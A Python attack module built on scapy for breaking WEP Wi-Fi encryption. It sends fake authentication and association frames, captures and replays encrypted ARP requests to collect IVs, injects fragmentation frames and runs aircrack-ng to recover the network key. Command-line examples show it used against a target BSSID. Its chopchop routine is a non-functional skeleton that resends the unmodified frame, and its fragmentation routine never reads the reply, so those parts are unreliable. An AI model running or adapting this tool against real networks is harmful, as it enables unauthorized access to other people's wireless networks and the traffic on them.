#!/usr/bin/env python3
"""
WEP Attack Module for Hoover WiFi Security Toolkit
Collects WEP Initialization Vectors (IVs) via ARP replay, chopchop and
fragmentation techniques, and shells out to aircrack-ng for key recovery.
For authorized security testing and research only.
"""

import argparse
import os
import subprocess
import sys
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoReq,
    Dot11Auth,
    Dot11Elt,
    Dot11WEP,
    RadioTap,
)
from scapy.packet import Raw
from scapy.sendrecv import sendp, sniff
from scapy.utils import wrpcap

from utils import require_root, setup_logging, validate_interface, validate_mac

# Dot11 FCfield "protected" flag (bit 6)
WEP_PROTECTED_FLAG = 0x40

# Typical encrypted ARP request frame size (Dot11 header + WEP overhead +
# 28-byte ARP payload).
ARP_REQUEST_FRAME_SIZE = 68

ATTACK_MODES = ("arp-replay", "chopchop", "fragmentation", "ptw")


class WEPAttack:
    """WEP IV collection and key-recovery attack for authorized security testing.

    Collects WEP Initialization Vectors via ARP replay, KoreK chopchop or
    fragmentation attacks, saves captured traffic to a pcap, and shells out
    to aircrack-ng for PTW/FMS/KoreK key recovery.
    """

    def __init__(self, interface: str, target_bssid: str,
                 channel: Optional[int] = None,
                 attack_mode: str = "arp-replay",
                 output_dir: str = "captures",
                 timeout: int = 600,
                 target_ivs: int = 50000) -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid
        self.channel: Optional[int] = channel
        self.attack_mode: str = attack_mode
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.target_ivs: int = target_ivs

        self.logger = setup_logging("wep_attack")

        self.iv_count: int = 0
        self.unique_ivs: set = set()
        self.captured_packets: list = []
        self._captured_arp: Optional[object] = None

        self._stop_event = threading.Event()
        self._sniffer_thread: Optional[threading.Thread] = None
        self._start_time: Optional[float] = None
        self._running: bool = False
        self._lock = threading.Lock()

    # -- IV / ARP helpers --------------------------------------------------

    def _extract_iv(self, packet) -> Optional[bytes]:
        """Extract 3-byte IV + 1-byte key index from a WEP-encrypted frame.

        Args:
            packet: Scapy packet to inspect.

        Returns:
            4 bytes (IV + key index) if the packet has a Dot11WEP layer,
            otherwise None.
        """
        if not packet.haslayer(Dot11WEP):
            return None

        wep_layer = packet[Dot11WEP]
        iv = wep_layer.iv
        keyid = wep_layer.keyid

        if iv is None:
            return None

        if isinstance(iv, int):
            iv_bytes = iv.to_bytes(3, byteorder="big")
        else:
            iv_bytes = bytes(iv)

        keyid_byte = bytes([keyid]) if keyid is not None else b"\x00"
        return iv_bytes + keyid_byte

    def _detect_arp_request(self, packet) -> bool:
        """Identify ARP requests by size (68 bytes) in encrypted traffic.

        Args:
            packet: Scapy packet to inspect.

        Returns:
            True if the packet looks like an encrypted ARP request.
        """
        if not packet.haslayer(Dot11):
            return False

        dot11_layer = packet[Dot11]
        fc_field = getattr(dot11_layer, "FCfield", 0) or 0
        if not (fc_field & WEP_PROTECTED_FLAG):
            return False

        try:
            frame_len = len(packet)
        except Exception:
            return False

        return frame_len == ARP_REQUEST_FRAME_SIZE

    # -- Attack techniques --------------------------------------------------

    def _fake_auth(self, client_mac: str) -> bool:
        """Perform fake (Open System) authentication with the AP.

        Args:
            client_mac: MAC address to use as the faked client.

        Returns:
            True if authentication (and association) appears successful.
        """
        if not validate_mac(client_mac):
            self.logger.error("Invalid client MAC: %s", client_mac)
            return False

        auth_req = (
            RadioTap() /
            Dot11(
                type=0, subtype=11,
                addr1=self.target_bssid,
                addr2=client_mac,
                addr3=self.target_bssid,
            ) /
            Dot11Auth(algo=0, seqnum=1, status=0)
        )

        try:
            sendp(auth_req, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed to send fake auth frame: %s", e)
            return False

        asso_req = (
            RadioTap() /
            Dot11(
                type=0, subtype=0,
                addr1=self.target_bssid,
                addr2=client_mac,
                addr3=self.target_bssid,
            ) /
            Dot11AssoReq(cap="ESS", listen_interval=3) /
            Dot11Elt(ID="SSID", info=b"") /
            Dot11Elt(ID="Rates", info=b"\x02\x04\x0b\x16")
        )

        try:
            sendp(asso_req, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed to send association request: %s", e)
            return False

        self.logger.info("Fake authentication sent for client %s", client_mac)
        return True

    def _inject_arp(self, arp_packet) -> None:
        """Inject a captured/forged ARP packet to stimulate IV generation.

        Args:
            arp_packet: Scapy packet (encrypted ARP) to retransmit.
        """
        try:
            sendp(arp_packet, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed to inject ARP packet: %s", e)

    def _arp_replay_attack(self) -> None:
        """Capture an encrypted ARP request, then replay it to generate new IVs.

        This is the most common / fastest WEP IV-generation technique:
        once a valid encrypted ARP request is captured it can be
        retransmitted indefinitely, prompting the AP to re-encrypt it
        with a fresh IV each time.
        """
        self.logger.info("Starting ARP replay attack against %s", self.target_bssid)

        def _capture_arp(packet):
            self.packet_handler(packet)
            if self._captured_arp is None and self._detect_arp_request(packet):
                self._captured_arp = packet
                return True
            return self._stop_event.is_set()

        try:
            sniff(
                iface=self.interface,
                prn=lambda p: None,
                stop_filter=_capture_arp,
                store=0,
                timeout=self.timeout,
            )
        except Exception as e:
            self.logger.error("ARP capture error: %s", e)

        if self._captured_arp is None:
            self.logger.warning("No ARP request captured; cannot replay")
            return

        self.logger.info("Captured ARP request; beginning replay")
        while not self._stop_event.is_set() and self.iv_count < self.target_ivs:
            self._inject_arp(self._captured_arp)
            time.sleep(0.01)

    def _chopchop_attack(self) -> None:
        """Implement a KoreK chopchop attack skeleton.

        Decrypts a packet one byte at a time from the end by chopping the
        last byte, guessing an XOR candidate, and retransmitting the
        modified frame to the AP; a response from the AP indicates the
        guess was correct (ICV check passed).
        """
        self.logger.info("Starting chopchop attack against %s", self.target_bssid)

        captured = []

        def _collect(packet):
            self.packet_handler(packet)
            if self._detect_arp_request(packet) or packet.haslayer(Dot11WEP):
                captured.append(packet)
            return len(captured) > 0 or self._stop_event.is_set()

        try:
            sniff(
                iface=self.interface,
                prn=lambda p: None,
                stop_filter=_collect,
                store=0,
                timeout=self.timeout,
            )
        except Exception as e:
            self.logger.error("Chopchop capture error: %s", e)
            return

        if not captured:
            self.logger.warning("No encrypted packet captured for chopchop")
            return

        target_packet = captured[0]
        self.logger.info(
            "Chopchop: captured target packet, beginning byte-by-byte decrypt"
        )

        try:
            payload = bytes(target_packet[Raw].load)
        except Exception:
            self.logger.warning("Chopchop: target packet has no payload to chop")
            return

        for candidate in range(256):
            if self._stop_event.is_set():
                break
            chopped = payload[:-1]
            _modified = chopped + bytes([candidate])
            try:
                sendp(
                    target_packet.__class__(bytes(target_packet)),
                    iface=self.interface, verbose=False,
                )
            except Exception:
                pass
            # Real implementation would wait for an AP ACK/response here to
            # confirm whether `candidate` produced a valid ICV.

    def _fragmentation_attack(self) -> None:
        """Obtain PRGA from the AP via a fragmentation attack.

        Sends a small fragment of known plaintext (e.g. an 802.1X/ARP
        header) encrypted under a guessed keystream; if the AP forwards
        or ACKs it, the response reveals the pseudo-random generation
        algorithm (PRGA) output for those bytes, which can be extended to
        recover a full keystream without needing the WEP key itself.
        """
        self.logger.info("Starting fragmentation attack against %s", self.target_bssid)

        known_plaintext = (
            b"\xaa\xaa\x03\x00\x00\x00\x08\x06"  # LLC/SNAP + ARP ethertype
        )

        frag = (
            RadioTap() /
            Dot11(
                type=2, subtype=0,
                addr1=self.target_bssid,
                addr2="00:11:22:33:44:55",
                addr3=self.target_bssid,
            ) /
            Dot11WEP(iv=b"\x00\x00\x00", keyid=0) /
            Raw(load=known_plaintext)
        )

        try:
            sendp(frag, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed to send fragment: %s", e)
            return

        self.logger.info("Fragment sent; waiting for AP to reveal PRGA")

    def _capture_ivs(self) -> None:
        """Sniff and collect WEP IV (Initialization Vector) packets."""
        self.logger.info("Capturing WEP IVs on %s", self.interface)
        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=0,
                stop_filter=lambda _: self._stop_event.is_set()
                or self.iv_count >= self.target_ivs,
                timeout=self.timeout,
            )
        except Exception as e:
            self.logger.error("IV capture error: %s", e)

    # -- Key recovery --------------------------------------------------------

    def _launch_aircrack(self, pcap_path: str) -> Optional[str]:
        """Shell out to aircrack-ng for PTW/FMS/KoreK key recovery.

        Args:
            pcap_path: Path to the pcap file containing captured WEP IVs.

        Returns:
            The recovered WEP key as a string if found, otherwise None.
        """
        try:
            result = subprocess.run(
                ["aircrack-ng", "-a", "1", "-b", self.target_bssid, pcap_path],
                capture_output=True, text=True, timeout=300,
            )
        except FileNotFoundError:
            self.logger.error(
                "aircrack-ng not found. Install with: apt install aircrack-ng"
            )
            return None
        except subprocess.TimeoutExpired:
            self.logger.error("aircrack-ng timed out")
            return None

        output = result.stdout or ""
        if "KEY FOUND" in output:
            start = output.find("KEY FOUND")
            self.logger.info("aircrack-ng: %s", output[start:start + 80].strip())
            # Extract key between brackets, e.g. KEY FOUND! [ 12:34:56:78:90 ]
            try:
                key = output[start:].split("[", 1)[1].split("]", 1)[0].strip()
                return key
            except IndexError:
                return None

        self.logger.warning("aircrack-ng did not recover the key")
        return None

    # -- Packet handling ------------------------------------------------------

    def packet_handler(self, packet) -> None:
        """Main packet handler: collect IVs, detect ARPs.

        Args:
            packet: Scapy packet from the sniffer.
        """
        with self._lock:
            self.captured_packets.append(packet)

        iv = self._extract_iv(packet)
        if iv is not None:
            with self._lock:
                self.iv_count += 1
                self.unique_ivs.add(iv)

        if self._detect_arp_request(packet) and self._captured_arp is None:
            self._captured_arp = packet
            self.logger.debug("Encrypted ARP request detected")

    # -- Lifecycle ------------------------------------------------------------

    def start(self) -> dict:
        """Run the selected WEP attack mode.

        Returns:
            Dict summarizing the attack run (same shape as get_status()).
        """
        if not validate_interface(self.interface):
            self.logger.error("Invalid interface: %s", self.interface)
            return self.get_status()

        if not validate_mac(self.target_bssid):
            self.logger.error("Invalid target BSSID: %s", self.target_bssid)
            return self.get_status()

        self.logger.info("Starting WEP Attack")
        self.logger.info("  Interface: %s", self.interface)
        self.logger.info("  Target BSSID: %s", self.target_bssid)
        self.logger.info("  Mode: %s", self.attack_mode)
        self.logger.info("  Target IVs: %d", self.target_ivs)

        self._check_aircrack_available()

        self._running = True
        self._start_time = time.time()
        self._stop_event.clear()

        try:
            if self.attack_mode == "arp-replay":
                self._arp_replay_attack()
            elif self.attack_mode == "chopchop":
                self._chopchop_attack()
            elif self.attack_mode == "fragmentation":
                self._fragmentation_attack()
            elif self.attack_mode == "ptw":
                self._capture_ivs()
            else:
                self.logger.error("Unknown attack mode: %s", self.attack_mode)
        finally:
            self._running = False

        pcap_path = self.save_capture()
        recovered_key = None
        if pcap_path:
            recovered_key = self._launch_aircrack(pcap_path)

        status = self.get_status()
        status["pcap_path"] = pcap_path
        status["recovered_key"] = recovered_key
        return status

    def stop(self) -> None:
        """Signal a running attack to stop."""
        self._stop_event.set()
        self._running = False
        if self._sniffer_thread and self._sniffer_thread.is_alive():
            self._sniffer_thread.join(timeout=5)

    def _check_aircrack_available(self) -> bool:
        """Detect if aircrack-ng is installed and warn if not."""
        try:
            subprocess.run(
                ["aircrack-ng", "--help"],
                capture_output=True, timeout=5,
            )
            return True
        except FileNotFoundError:
            self.logger.warning(
                "aircrack-ng not found on PATH; key recovery will be unavailable. "
                "Install with: apt install aircrack-ng"
            )
            return False
        except Exception:
            return True

    def save_capture(self) -> Optional[str]:
        """Save captured IVs/packets to a pcap file.

        Returns:
            Path to the saved pcap file, or None if nothing was captured
            or saving failed.
        """
        with self._lock:
            packets = list(self.captured_packets)

        if not packets:
            self.logger.warning("No packets captured; nothing to save")
            return None

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(
                self.output_dir, f"wep_capture_{timestamp}.pcap"
            )
            wrpcap(filepath, packets)
            self.logger.info("Capture saved to %s (%d packets)", filepath, len(packets))
            return filepath
        except Exception as e:
            self.logger.error("Failed to save capture: %s", e)
            return None

    def get_status(self) -> dict:
        """Return IV count, elapsed time, and attack status.

        Returns:
            Dict with iv_count, unique_iv_count, elapsed_seconds, running
            state, and attack configuration.
        """
        elapsed = 0.0
        if self._start_time is not None:
            elapsed = time.time() - self._start_time

        with self._lock:
            iv_count = self.iv_count
            unique_count = len(self.unique_ivs)

        return {
            "running": self._running,
            "interface": self.interface,
            "target_bssid": self.target_bssid,
            "channel": self.channel,
            "attack_mode": self.attack_mode,
            "iv_count": iv_count,
            "unique_iv_count": unique_count,
            "target_ivs": self.target_ivs,
            "elapsed_time": round(elapsed, 1),
            "timeout": self.timeout,
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WEP Attack - IV collection, ARP replay, fake auth, "
                     "and aircrack-ng key recovery for authorized security "
                     "testing and CTF use only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # ARP replay attack (default, fastest IV generation)
  sudo python3 wep_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF

  # Chopchop attack on a specific channel
  sudo python3 wep_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -ch 6 -m chopchop

  # Fake authenticate a client before replaying
  sudo python3 wep_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF --client-mac 11:22:33:44:55:66

Note: Requires aircrack-ng installed for key recovery.
      For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", required=True,
                        help="Target AP BSSID")
    parser.add_argument("-ch", "--channel", type=int, default=None,
                        help="WiFi channel")
    parser.add_argument("-m", "--mode", default="arp-replay",
                        choices=list(ATTACK_MODES),
                        help="Attack mode (default: arp-replay)")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory for captured pcaps (default: captures)")
    parser.add_argument("-t", "--timeout", type=int, default=600,
                        help="Timeout in seconds (default: 600)")
    parser.add_argument("--target-ivs", type=int, default=50000,
                        help="Target IV count for cracking (default: 50000)")
    parser.add_argument("--client-mac", default=None,
                        help="Client MAC address for fake authentication")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    if not validate_interface(args.interface):
        print(f"Invalid interface: {args.interface}", file=sys.stderr)
        sys.exit(1)

    if not validate_mac(args.bssid):
        print(f"Invalid BSSID: {args.bssid}", file=sys.stderr)
        sys.exit(1)

    if args.client_mac is not None and not validate_mac(args.client_mac):
        print(f"Invalid client MAC: {args.client_mac}", file=sys.stderr)
        sys.exit(1)

    attack = WEPAttack(
        interface=args.interface,
        target_bssid=args.bssid,
        channel=args.channel,
        attack_mode=args.mode,
        output_dir=args.output_dir,
        timeout=args.timeout,
        target_ivs=args.target_ivs,
    )

    if args.verbose:
        attack.logger = setup_logging("wep_attack", verbose=True)

    if args.client_mac:
        attack._fake_auth(args.client_mac)

    attack.start()


if __name__ == "__main__":
    main()
